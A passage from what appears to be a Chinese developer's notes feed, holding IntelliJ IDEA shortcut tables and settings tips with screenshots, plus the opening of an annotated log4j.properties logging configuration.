<td>Ctrl+Shift + J</td>
<td>Smart line join</td>
<td>光标所在行和其下一行，或者选择的代码块，合并到一行</td>
</tr>
<tr>
<td>Ctrl+Enter</td>
<td>Smart line split</td>
<td>行拆分</td>
</tr>
<tr>
<td>Shift + Enter</td>
<td>Start new line</td>
<td>打开新的一行</td>
</tr>
<tr>
<td>Ctrl + Shift + U</td>
<td>Toggle case for word at caret or selected block</td>
<td>在光标所在词语或选定块中切换单词的大小写</td>
</tr>
<tr>
<td>Ctrl + Shift + ]/[</td>
<td>Select till code block end/start</td>
<td>选择直到代码块结束/开始</td>
</tr>
<tr>
<td>Ctrl + Delete/Backspace</td>
<td>Delete to word end/start</td>
<td>删除至单词结束/开始</td>
</tr>
<tr>
<td>Ctrl + NumPad+/-</td>
<td>Expand/collapse code block</td>
<td>展开/折叠代码块</td>
</tr>
<tr>
<td>Ctrl + Shift+NumPad+</td>
<td>Expand all</td>
<td>展开所有代码块</td>
</tr>
<tr>
<td>Ctrl + Shift+NumPad-</td>
<td>Collapse all</td>
<td>折叠所有代码块</td>
</tr>
<tr>
<td>Ctrl + F4</td>
<td>Close active editor tab</td>
<td>关闭当前活动的编辑窗口</td>
</tr>
<tr>
<td>Ctrl + F12</td>
<td></td>
<td>当前类内搜索方法</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt + Q</td>
<td>Context info</td>
<td><em>上下文信息</em></td>
</tr>
<tr>
<td>Shift + F1</td>
<td>External Doc</td>
<td><em>外部文件</em></td>
</tr>
</tbody>
</table>
<h1>Usage Search</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt + F7/Ctrl + F7</td>
<td>Find usages/Find usages in file</td>
<td>查找用法/在文件中查找【参数/方法】使用到的地方</td>
</tr>
<tr>
<td>Ctrl + Shift + F7</td>
<td>Highlight usages in file</td>
<td>高亮【参数/方法】使用到的地方</td>
</tr>
<tr>
<td>Ctrl + Alt + F7</td>
<td>Show usages</td>
<td>弹出【参数/方法】使用到的列表</td>
</tr>
</tbody>
</table>
<h1>Navigation</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt + Right/Left</td>
<td>Go to next / previous editor tab</td>
<td>左边的编辑框/右边的编辑框</td>
</tr>
<tr>
<td>F12</td>
<td>Go back to previous tool window</td>
<td>项目结构中，选中当前文件</td>
</tr>
<tr>
<td>Esc</td>
<td>Go to editor (from tool window)</td>
<td>光标回到编辑栏</td>
</tr>
<tr>
<td>Shift + Esc</td>
<td>Hide active or last active window</td>
<td>关闭最新打开的工具栏</td>
</tr>
<tr>
<td>Ctrl+Shift+F4</td>
<td>Close active run / messages / find / … tab</td>
<td>关闭活动的工具栏</td>
</tr>
<tr>
<td>Ctrl+G</td>
<td>Go to line</td>
<td>跳转到指定行</td>
</tr>
<tr>
<td>Ctrl+E</td>
<td>Recent files popup</td>
<td>弹框显示最近使用过的文件</td>
</tr>
<tr>
<td>Ctrl+Alt + Left/Right</td>
<td>Navigate back / forward</td>
<td>后退/前进</td>
</tr>
<tr>
<td>Ctrl+Shift+Backspace</td>
<td>Navigate to last edit location</td>
<td>关闭工具窗口，光标回到最后编辑的文件（类似Esc）</td>
</tr>
<tr>
<td>Alt + F1</td>
<td>Select current file or symbol in any view</td>
<td>选择一个视图，显示当前文件或符号（资源管理器、浏览器、结构图等）</td>
</tr>
<tr>
<td>Ctrl + B , Ctrl + Click</td>
<td>Go to declaration</td>
<td>跳转到声明或者用例处</td>
</tr>
<tr>
<td>Ctrl + Alt + B</td>
<td>Go to implementation(s)</td>
<td>跳转到实现处</td>
</tr>
<tr>
<td>Ctrl + Shift + I</td>
<td>Open quick definition lookup</td>
<td>弹框中查看类文件</td>
</tr>
<tr>
<td>Ctrl + Shift + B</td>
<td>Go to type declaration</td>
<td>跳转类型声明处</td>
</tr>
<tr>
<td>Ctrl + Shift + T</td>
<td></td>
<td>转到测试类</td>
</tr>
<tr>
<td>Ctrl + U</td>
<td>Go to super-method / super-class</td>
<td>跳转父方法/父类</td>
</tr>
<tr>
<td>Alt + Up/Down</td>
<td>Go to previous / next method</td>
<td>光标转到前/后一个方法</td>
</tr>
<tr>
<td>Ctrl + ]/[</td>
<td>Move to code block end/start</td>
<td>光标跳转到代码块的结尾/开头</td>
</tr>
<tr>
<td>Ctrl + F12</td>
<td>File structure popup</td>
<td>弹出类结构</td>
</tr>
<tr>
<td>Ctrl + H</td>
<td>Type hierarchy</td>
<td>打开类型层次结构</td>
</tr>
<tr>
<td>Ctrl + Shift + H</td>
<td>Method hierarchy</td>
<td>打开方法层次结构</td>
</tr>
<tr>
<td>Ctrl + Alt + H</td>
<td>Call hierarchy</td>
<td>打开调用层次结构</td>
</tr>
<tr>
<td>F2 / Shift + F2</td>
<td>Next/previous highlighted error</td>
<td>下一个/前一个 error</td>
</tr>
<tr>
<td>F4</td>
<td>Edit source / View source</td>
<td>编辑/查看文件</td>
</tr>
<tr>
<td>Alt + Home</td>
<td>Show navigation bar</td>
<td>显示代码导航栏</td>
</tr>
<tr>
<td>F11</td>
<td>Toggle bookmark</td>
<td>加上/去掉书签</td>
</tr>
<tr>
<td>Ctrl + F11</td>
<td>Toggle bookmark with mnemonic</td>
<td>添加标记书签</td>
</tr>
<tr>
<td>Ctrl + #[0-9]</td>
<td>Go to numbered bookmark</td>
<td>转到编号书签</td>
</tr>
<tr>
<td>Shift + F11</td>
<td>Show bookmarks</td>
<td>弹框，列出书签</td>
</tr>
</tbody>
</table>
<h1>Search/Replace</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Double Shift</td>
<td>Search everywhere</td>
<td>搜索任意文件</td>
</tr>
<tr>
<td>Ctrl + F</td>
<td>Find</td>
<td>当前文件查找</td>
</tr>
<tr>
<td>F3 / Shift + F3</td>
<td>Find next / Find previous</td>
<td>配合“Ctrl + F” 查找下一个/前一个</td>
</tr>
<tr>
<td>Ctrl + R</td>
<td>Replace</td>
<td>当前文件替换</td>
</tr>
<tr>
<td>Ctrl + Shift + F</td>
<td>Find in pathqu</td>
<td>全局查找</td>
</tr>
<tr>
<td>Ctrl + Shift + R</td>
<td>Replace in path</td>
<td>全局替换</td>
</tr>
<tr>
<td>Ctrl + N</td>
<td>Go to class</td>
<td>搜索类</td>
</tr>
<tr>
<td>Ctrl + Shift + N</td>
<td>Go to file</td>
<td>搜索文件</td>
</tr>
<tr>
<td>Ctrl + Alt + Shift + N</td>
<td>Go to symbol</td>
<td>搜索符号</td>
</tr>
<tr>
<td>Ctrl + Shift + A</td>
<td>Find Action</td>
<td>搜索操作</td>
</tr>
</tbody>
</table>
<h1>Live Templates</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl + Alt + J</td>
<td>Surround with Live Template</td>
<td></td>
</tr>
<tr>
<td>Ctrl + J</td>
<td>Insert Live Template</td>
<td>弹出模板选择需要的代码片段</td>
</tr>
<tr>
<td>iter</td>
<td>Iteration according to Java SDK 1.5 style</td>
<td>for (Object o : ) {      }</td>
</tr>
<tr>
<td>inst</td>
<td>Checkobjecttype with instanceof and downcast it</td>
<td>if (name instanceof Object) {     Object o = (Object) name;      }</td>
</tr>
<tr>
<td>itco</td>
<td>Iterate elements of java.util.Collection</td>
<td>for (Iterator iterator = collection.iterator(); iterator.hasNext(); ) {     Object next =  iterator.next();      }</td>
</tr>
<tr>
<td>itit</td>
<td>Iterate elements of java.util.Iterator</td>
<td>while (iterator.hasNext()) {     Object next =  iterator.next();      }</td>
</tr>
<tr>
<td>itli</td>
<td>Iterate elements of java.util.List</td>
<td>for (int i = 0; i &lt; list.size(); i++) {     Object o =  list.get(i);</td>
</tr>
<tr>
<td>thr</td>
<td>throw new</td>
<td>throw new</td>
</tr>
</tbody>
</table>
<h1>Refactoring：重构</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>F5</td>
<td>Copy</td>
<td>复制文件</td>
</tr>
<tr>
<td>F6</td>
<td>Move</td>
<td>移动文件</td>
</tr>
<tr>
<td>Alt + Delete</td>
<td>Safe Delete</td>
<td></td>
</tr>
<tr>
<td>Shift + F6</td>
<td>Rename</td>
<td>重命名（F12 先选中）</td>
</tr>
<tr>
<td>Ctrl + F6</td>
<td>Change Signature</td>
<td>更改签名</td>
</tr>
<tr>
<td>Ctrl + Alt + N</td>
<td>Inline</td>
<td></td>
</tr>
<tr>
<td>Ctrl + Alt + M</td>
<td>Extract Method</td>
<td>提取代码块为一个method</td>
</tr>
<tr>
<td>Ctrl + Alt + V</td>
<td>Extract Variable</td>
<td>提取变量（定义一个新变量，保留当前变量的值）<br>修改前：<br>return name;<br>修改后：<br>String name1 = name; <br>return name1;</td>
</tr>
<tr>
<td>Ctrl + Alt + F</td>
<td>Extract Field</td>
<td>提取变量为类的一个字段。</td>
</tr>
<tr>
<td>Ctrl + Alt + C</td>
<td>Extract Constant</td>
<td>提取静态变量</td>
</tr>
<tr>
<td>Ctrl + Alt + P</td>
<td>Extract Parameter</td>
<td>提取方法入参</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>Debugging</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>F7 / F8</td>
<td>Step into / Step over</td>
<td>步入/步出（F5/F6）</td>
</tr>
<tr>
<td>Shift + F7 / Shift + F8</td>
<td>Smart step into/Step out</td>
<td></td>
</tr>
<tr>
<td>Alt + F9</td>
<td>Run to cursor</td>
<td>跑到下一断点</td>
</tr>
<tr>
<td>Alt + F8</td>
<td>Evaluate expression</td>
<td>计算表达式</td>
</tr>
<tr>
<td>F9</td>
<td>Resume program</td>
<td>重新开始程序（F11）</td>
</tr>
<tr>
<td>Ctrl + F8</td>
<td>Toggle breakpoint</td>
<td>加上/去掉 断点</td>
</tr>
<tr>
<td>Ctrl + Shift + F8</td>
<td>View breakpoints</td>
<td>查看断点</td>
</tr>
</tbody>
</table>
<h1>Compile and Run</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl + F9</td>
<td>Make project (compile modifed and dependent)</td>
<td>构建项目</td>
</tr>
<tr>
<td>Ctrl + Shift + F9</td>
<td>Compile selected file, package or module</td>
<td>重新编译</td>
</tr>
<tr>
<td>Alt + Shift + F10/F9</td>
<td>Select configuration and run/and debug</td>
<td>打开run/debug的配置文件</td>
</tr>
<tr>
<td>Shift + F10/F9</td>
<td>Run/Debug</td>
<td>Run/Debug 程序</td>
</tr>
<tr>
<td>Ctrl + Shift + F10</td>
<td>Run context configuration from editor</td>
<td>从编辑器运行上下文配置</td>
</tr>
<tr>
<td>Ctrl + F2</td>
<td></td>
<td>stop 程序</td>
</tr>
</tbody>
</table>
<h1>VCS/Local History</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl + K</td>
<td>Commit project to VCS</td>
<td>提交</td>
</tr>
<tr>
<td>Ctrl + T</td>
<td>Update from VCS</td>
<td>更新</td>
</tr>
<tr>
<td>Alt + Shift + C</td>
<td>View recent changes</td>
<td>打开最近变更内容列表</td>
</tr>
<tr>
<td>Alt + BackQuote (`)</td>
<td>VCS Operations Popup</td>
<td>弹出版本控制选项框</td>
</tr>
</tbody>
</table>
<h1>General</h1>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>英文说明</th>
<th>中文说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alt + #[0-9]</td>
<td>Open corresponding tool window</td>
<td>打开相应的工具窗口</td>
</tr>
<tr>
<td>Ctrl + S</td>
<td>Save all</td>
<td>保存</td>
</tr>
<tr>
<td>Ctrl + Alt + Y</td>
<td>Synchronize</td>
<td>同步（reload）</td>
</tr>
<tr>
<td>Ctrl + Shift + F12</td>
<td>Toggle maximizing editor</td>
<td>最大化/恢复 编辑窗口</td>
</tr>
<tr>
<td>Alt + Shift + F</td>
<td>Add to Favorites</td>
<td>添加收藏</td>
</tr>
<tr>
<td>Alt + Shift + I</td>
<td>Inspect current file with current profile</td>
<td>使用当前配置文件检查当前文件</td>
</tr>
<tr>
<td>Ctrl + BackQuote (`)</td>
<td>Quick switch current scheme</td>
<td>切换IDEA主题模式</td>
</tr>
<tr>
<td>Ctrl + Alt + S</td>
<td>Open Settings dialog</td>
<td>打开设置</td>
</tr>
<tr>
<td>Ctrl + Alt + Shift + S</td>
<td>Open Project Structure dialog</td>
<td>打开项目结构</td>
</tr>
<tr>
<td>Ctrl + Tab</td>
<td>Switch between tabs and tool window</td>
<td>打开切换器（类似于windows的任务栏）</td>
</tr>
</tbody>
</table>
<h1>查看当前类的父类（Ctrl+Alt+Shift+u）</h1>
<p>下面看这个编辑器怎么以图解的形式，查看这种继承关系。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127223845078.png" alt="image-20211127223845078"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127223909961.png" alt="image-20211127223909961"></p>
<h1>打开子类工具栏：F4</h1>
<p>利用的： 顶部菜单 <code>Navigate --&gt; Type Hierarchy</code></p>
<h1>弹出子类UML图：Ctrl+Alt+u</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127224042688.png" alt="image-20211127224042688"></p>
<p>设置相关快捷键</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127225955330.png" alt="image-20211127225955330"></p>
<h1>弹出层显示的记录文件个数（Ctrl + E）</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127231134179.png" alt="image-20211127231134179"></p>
<h1>行拷贝（Ctrl+Alt+⬇）</h1>
<p>Duplicate Line Or Selection</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380260866347-1678439895424-11.png" alt="30f63f77a3c8b29426f7f6411d13f4b9.png"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA配置</title>
    <url>/20221026/1a8c2722.html</url>
    <content><![CDATA[<p>[Toc]</p>
<h1>编码配置</h1>
<h2 id="全局编码">全局编码</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-163802678409512.png" alt="57826dd953a5c863292bed5462025d60.png"></p>
<h2 id="文件编码">文件编码</h2>
<p>打开需要设置编码的文件，在右下角进行设置</p>
<h2 id="编码统一">编码统一</h2>
<h3 id="File-Encodings">File Encodings</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211125093711347.png" alt="image-20211125093711347"></p>
<h1>文件默认打开方式</h1>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380266644219.png" alt="fce0704d161bda7eec8a5cc4743cc062.png"></p>
<p>如上图标注 1 所示，该区域的后缀类型文件在 IntelliJ IDEA 中将以标注 2 的方式进行打开。</p>
<p>如上图标注 3 所示，我们可以在 IntelliJ IDEA 中忽略某些后缀的文件或是文件夹，比如我一般会把 .idea 这个文件夹忽略。</p>
<h1>字体设置</h1>
<h2 id="界面字体">界面字体</h2>
<p>Settings-&gt;Appearance</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-163802676145910.png" alt="e8ad5d669969dbce8a1e35d6269013df.png"></p>
<h2 id="程序字体">程序字体</h2>
<p>Editor -&gt; Colors &amp; Fonts -&gt; Font</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802676145911.png" alt="5e3013e5dad6b0e05e97274216472a90.png"></p>
<h1>代码注释</h1>
<h2 id="修改类注释模板">修改类注释模板</h2>
<p><code>File-&gt;Settings-&gt;File and Code Templates 找到Includes</code></p>
<h2 id="单行注释、注释块">单行注释、注释块</h2>
<p>搜索：<code>Add a space at line comment start</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220304151518515-1678442134982-139.png" alt="image-20220304151518515"></p>
<h1>代码提示</h1>
<h2 id="代码提示快捷键（Ctrl-逗号）">代码提示快捷键（Ctrl+逗号）</h2>
<p>如图所示，默认<code> Ctrl + 空格</code> 快捷键是<code>基础代码提示、补充</code>快捷键，但是由于我们中文系统基本这个快捷键都被输入法占用了，</p>
<p>所以我们发现不管怎么按都是没有提示代码效果的，原因就是在此。我个人建议修改此快捷键为<code> Ctrl + 逗号</code>。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127232203726-1678441234800-133.png" alt="image-20211127232203726"></p>
<h2 id="鼠标放上去提示参数">鼠标放上去提示参数</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802681052513-1678440029357-19.png" alt="0e6d5bfa29683800dc3eae4602afc8a8.png"></p>
<h1>代码格式化</h1>
<h2 id="格式化代码后，多行空行转为一行">格式化代码后，多行空行转为一行</h2>
<p>idea格式化代码后会出现最多2行空行，不能像eclipse一样最多只保留一行空行，要想设置的和eclipse效果一样，设置如下</p>
<p>File --&gt; setting --&gt; 搜索 code style --&gt; 选择 blank lines标签项 --&gt; 保留最大空行数设置为1</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230244828-1678442048160-136.png" alt="image-20211127230244828"></p>
<h1>代码查看窗口</h1>
<h2 id="软分行查看代码">软分行查看代码</h2>
<p>右键</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image001-1678440029363-29.png" alt="9fff17978c4752eeb8d4c127c9e2a554.png"></p>
<h2 id="文件打开列表超过一行，放多行显示">文件打开列表超过一行，放多行显示</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230844516-1678442240545-142.png" alt="image-20211127230844516"></p>
<p>如上图标注 1 所示，在打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的文件名 Tab 单行显示的。可以修改为多行</p>
<h2 id="默认代码展示形式（折叠-展开）">默认代码展示形式（折叠/展开）</h2>
<p>我们可以对指定代码类型进行默认折叠或是展开的设置，勾选上的表示该类型的代码在文件被打开的时候默认是被折叠的，去掉勾选则反之。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310180729245.png" alt="image-20230310180729245"></p>
<h2 id="行号和方法分割线">行号和方法分割线</h2>
<p>默认 IntelliJ IDEA 是没有勾选 <code>Show line numbers</code> 显示行数的，但是我建议一般这个要勾选上。</p>
<p>默认 IntelliJ IDEA 是没有勾选<code> Show method separators</code> 显示方法线的，这种线有助于我们区分开方法，所以也是建议勾选上的。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-1678442240552-146.png" alt="2c9d0deb2e32bea240016e879acd4cb7.png"></p>
<h2 id="增加打开的文件-Tab-个数">增加打开的文件 Tab 个数</h2>
<p>Tab limit</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380259713575-1678442240553-150.png" alt="3a13ec2347321bd1c23131c75e5f6808.png"></p>
<h2 id="单文件多窗口打开">单文件多窗口打开</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16380260699266-1678442240553-152.png" alt="a1f9f345240dd5190a929ffc0fe14de1.png"></p>
<h2 id="默认隐藏注释">默认隐藏注释</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207181024546.png" alt="image-20230207181024546"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j日常使用记录</title>
    <url>/20221030/14631848.html</url>
    <content><![CDATA[<h1>log4j.properties 配置说明</h1>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">log4J</span> <span class="token value attr-value">日志信息log4j.properties配置说明</span>
<span class="token comment">##logger是进行记录的主要类，appender是记录的方式,layout是记录的格式</span>
<span class="token comment">#Logger 日志写出器，供程序员输出日志信息</span>
<span class="token comment">#Appender 日志目的地，把格式化好的日志信息输出到指定的地方去</span>
<span class="token comment">#ConsoleAppender 目的地为控制台的Appender</span>
<span class="token comment">#FileAppender 目的地为文件的Appender</span>
<span class="token comment">#RollingFileAppender 目的地为大小受限的文件的Appender</span>
<span class="token comment">#Layout 日志格式化器，用来把程序员的logging request格式化成字符串</span>
<span class="token comment">#PatternLayout 用指定的pattern格式化logging request的Layou</span>
<span class="token comment">#Log4j提供的appender有以下几种：</span>
<span class="token comment">#　　org.apache.log4j.ConsoleAppender（控制台），</span>
<span class="token comment">#　　org.apache.log4j.FileAppender（文件），</span>
<span class="token comment">#　　org.apache.log4j.DailyRollingFileAppender（每天产生一个日志文件），</span>
<span class="token comment">#　　org.apache.log4j.RollingFileAppender（文件大小到达指定尺寸的时候产生一个新的文件），</span>
<span class="token comment">#　　org.apache.log4j.WriterAppender（将日志信息以流格式发送到任意指定的地方）</span>
<span class="token comment">#Log4j提供的layout有以下几种：</span>
<span class="token comment">#　　org.apache.log4j.HTMLLayout（以HTML表格形式布局），</span>
<span class="token comment">#　　org.apache.log4j.PatternLayout（可以灵活地指定布局模式），</span>
<span class="token comment">#　　org.apache.log4j.SimpleLayout（包含日志信息的级别和信息字符串），</span>
<span class="token comment">#　　org.apache.log4j.TTCCLayout（包含日志产生的时间、线程、类别等等信息）</span>
<span class="token comment">#Log4J采用类似C语言中的printf函数的打印格式格式化日志信息，打印参数如下</span>
<span class="token comment"># %m 输出代码中指定的消息</span>
<span class="token comment"># %M 输出日志发生的方法名</span>
<span class="token comment">#　　%p 输出优先级，即DEBUG，INFO，WARN，ERROR，FATAL</span>
<span class="token comment">#　　%r 输出自应用启动到输出该log信息耗费的毫秒数</span>
<span class="token comment">#　　%c 输出所属的类目，通常就是所在类的全名</span>
<span class="token comment">#　　%t 输出产生该日志事件的线程名</span>
<span class="token comment">#　　%n 输出一个回车换行符，Windows平台为“rn”，Unix平台为“n”</span>
<span class="token comment">#　　%d 输出日志时间点的日期或时间，默认格式为ISO8601，也可以在其后指定格式，比如：%d{yyyy MMM dd HH:mm:ss,SSS}，输出类似：2002年10月18日 22：10：28，921</span>
<span class="token comment">#　　%l 输出日志事件的发生位置，包括类目名、发生的线程，以及在代码中的行数。举例：Testlog4.main(TestLog4.java:10)</span>
<span class="token comment"># %L 输出日志发生的位置</span>
<span class="token comment"># %F 输出类名</span>
<span class="token comment">#####################################################################</span>
<span class="token comment">#设置级别和目的地 -- 把日志等级为debug的日志信息输出到stdout和SYS,QUERY这三个目的地</span>
<span class="token key attr-name">log4j.rootLogger</span><span class="token punctuation">=</span><span class="token value attr-value">debug,STDOUT</span>
<span class="token comment"># stdout:目的地 -- 打印到屏幕</span>
<span class="token comment">## org.apache.log4j.ConsoleAppender:控制台</span>
<span class="token key attr-name">log4j.appender.STDOUT</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.ConsoleAppender</span>
<span class="token comment">## org.apache.log4j.PatternLayout:灵活地指定布局模式</span>
<span class="token key attr-name">log4j.appender.STDOUT.layout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.PatternLayout</span>
<span class="token comment">## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%c-%M] %m%n [%-5p][%d{HH:mm:ss}][%l] %m%n</span>
<span class="token key attr-name">log4j.appender.STDOUT.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token value attr-value">[%-5p][%d{yyyy-MM-dd HH:mm:ss sss}][%t][%c-%M][%L](%F:%L) - %m%n</span>

<span class="token comment"># QUERY:目的地 -- 输出到文件(限定每个文件大小)</span>
<span class="token comment">## 凡是 info、warn、error、fatal 级别的数据都会在这里执行输出到 query.log 日志文件中</span>
<span class="token comment">##log4j.logger.QUERY=INFO,QUERY</span>
<span class="token key attr-name">log4j.logger.QUERY</span><span class="token punctuation">=</span><span class="token value attr-value">INFO</span>
<span class="token comment">##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加</span>
<span class="token key attr-name">log4j.appender.QUERY</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.RollingFileAppender</span>
<span class="token comment">##设置文件输出路径;html:log/query.html</span>
<span class="token key attr-name">log4j.appender.QUERY.File</span><span class="token punctuation">=</span><span class="token value attr-value">log/query.log</span>
<span class="token comment">##设置文件输出样式;html格式： org.apache.log4j.HTMLLayout</span>
<span class="token key attr-name">log4j.appender.QUERY.layout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.PatternLayout</span>
<span class="token comment">## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n</span>
<span class="token key attr-name">log4j.appender.QUERY.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token value attr-value">[%-5p][%d{yyyy-MM-dd HH:mm:ss}][%c-%M] %m%n</span>
<span class="token comment">## 指定文件的最大 大小</span>
<span class="token key attr-name">log4j.appender.QUERY.MaxFileSize</span><span class="token punctuation">=</span><span class="token value attr-value">2048KB</span>
<span class="token comment">## 可被备份的日志数</span>
<span class="token key attr-name">log4j.appender.QUERY.MaxBackupIndex</span><span class="token punctuation">=</span><span class="token value attr-value">100</span>

<span class="token comment"># SYS:目的地 -- 输出到文件(每天产生一个文件)</span>
<span class="token comment">## 凡是 error、fatal 级别的数据都会在这里执行输出到 sys.log 日志文件中</span>
<span class="token comment">#log4j.logger.SYS=error,SYS</span>
<span class="token key attr-name">log4j.logger.SYS</span><span class="token punctuation">=</span><span class="token value attr-value">error</span>
<span class="token comment">## org.apache.log4j.RollingFileAppender:每天产生一个日志文件</span>
<span class="token comment">#使用org.apache.log4j.FileAppender：日志会在一个文件中追加</span>
<span class="token key attr-name">log4j.appender.SYS</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.DailyRollingFileAppender</span>
<span class="token comment">##设置文件输出路径 ${user.home}/log/sys.log</span>
<span class="token key attr-name">log4j.appender.SYS.File</span><span class="token punctuation">=</span><span class="token value attr-value">log/sys.log</span>
<span class="token comment">## org.apache.log4j.PatternLayout:灵活地指定布局模式</span>
<span class="token key attr-name">log4j.appender.SYS.layout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.PatternLayout</span>
<span class="token comment">## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n</span>
<span class="token key attr-name">log4j.appender.SYS.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token value attr-value">[%-5p][%d{HH:mm:ss}][%C-%M] %m%n</span>
<span class="token comment">#设置特定包的级别</span>
<span class="token comment">## 把com.swh.weixin包下的日志内容显示级别为debug,和目的地</span>
<span class="token comment">## 把com.swh.weixin.util包下日志等级为debug的信息输出到pack 目的地</span>
<span class="token comment">#log4j.logger.com.swh.weixin.util=debug,pack</span>
<span class="token comment">##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加</span>
<span class="token key attr-name">log4j.appender.pack</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.RollingFileAppender</span>
<span class="token comment">##设置文件输出路径 或者 ${user.home}/log/pack.log</span>
<span class="token key attr-name">log4j.appender.pack.File</span><span class="token punctuation">=</span><span class="token value attr-value">log/pack.log</span>
<span class="token comment">##设置文件输出样式</span>
<span class="token key attr-name">log4j.appender.pack.layout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.PatternLayout</span>
<span class="token comment">## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%n</span>
<span class="token key attr-name">log4j.appender.pack.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token value attr-value">[%-5p][%d{yyyy MM dd HH:mm:ss}][%c-%M] %m%n</span>
<span class="token comment">## 指定文件的最大 大小</span>
<span class="token key attr-name">log4j.appender.pack.MaxFileSize</span><span class="token punctuation">=</span><span class="token value attr-value">1024KB</span>
<span class="token comment">#日志最大备份数目</span>
<span class="token key attr-name">log4j.appender.pack.MaxBackupIndex</span><span class="token punctuation">=</span><span class="token value attr-value">100</span>
<span class="token comment">########################################################################</span>
<span class="token comment">##设置级别和目的地</span>
<span class="token comment">#log4j.rootLogger=debug,appender1,appender2</span>
<span class="token comment">##只设置特定包的级别和目的地</span>
<span class="token comment">#log4j.logger.com.coderdream=debug,appender1</span>
<span class="token comment">#log4j.logger.com.coderdream.Dao=info,appender1,appender2</span>
<span class="token comment">##输出到控制台</span>
<span class="token comment">#log4j.appender.appender1=org.apache.log4j.ConsoleAppender</span>
<span class="token comment">##设置输出样式</span>
<span class="token comment">#log4j.appender.appender1.layout=org.apache.log4j.PatternLayout</span>
<span class="token comment">##自定义样式</span>
